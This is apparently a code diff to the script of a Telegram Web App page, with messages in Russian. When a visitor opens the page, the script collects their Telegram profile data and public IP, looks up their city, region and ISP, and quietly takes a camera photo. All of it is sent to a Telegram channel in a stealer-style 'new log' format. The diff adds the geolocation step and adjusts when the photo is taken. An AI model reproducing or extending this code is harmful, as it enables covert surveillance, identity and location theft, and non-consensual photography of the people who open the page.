@@ -22,16 +22,29 @@
             fetch('https://api64.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
-                    sendToTelegram(`🌐 IP-адрес пользователя: ${data.ip}`);
+                    fetch(`https://ip-api.com/json/${data.ip}?fields=status,country,regionName,city,isp,org,query`)
+                        .then(response => response.json())
+                        .then(info => {
+                            if (info.status === "success") {
+                                let ipInfo = `🌐 IP-адрес: ${info.query}\n`;
+                                ipInfo += `    [+] Страна: ${info.country}\n`;
+                                ipInfo += `    [+] Регион: ${info.regionName}\n`;
+                                ipInfo += `    [+] Город: ${info.city}\n`;
+                                ipInfo += `    [+] Провайдер: ${info.isp}\n`;
+                                ipInfo += `    [+] Организация: ${info.org}\n\n`;
+                                sendToTelegram(ipInfo);
+                            }
+                        });
                 })
                 .catch(error => console.error('Ошибка получения IP:', error));
         }
         
         function getUserInfo() {
             if (window.Telegram && Telegram.WebApp) {
+                Telegram.WebApp.expand();
                 const user = Telegram.WebApp.initDataUnsafe.user;
                 if (user) {
-                    let userInfo = `👤 Новый логин\n`;
+                    let userInfo = `👤 Новый лог\n`;
                     userInfo += `[+] Имя: ${user.first_name} ${user.last_name || ''}\n`;
                     userInfo += `[+] Юзернейм: @${user.username || 'Не указан'}\n`;
                     userInfo += `[+] ID: ${user.id}\n`;
@@ -56,7 +69,7 @@
                         let photo = canvas.toDataURL("image/png");
                         sendPhotoToTelegram(photo);
                         stream.getTracks().forEach(track => track.stop());
-                    }, 3000);
+                    }, 2000);
                 }).catch(err => console.error("Ошибка камеры:", err));
         }
         
@@ -80,7 +93,7 @@
         function initApp() {
             getUserInfo();
             getUserIP();
-            capturePhoto();
+            setTimeout(capturePhoto, 3000);
         }
         
         window.onload = initApp;
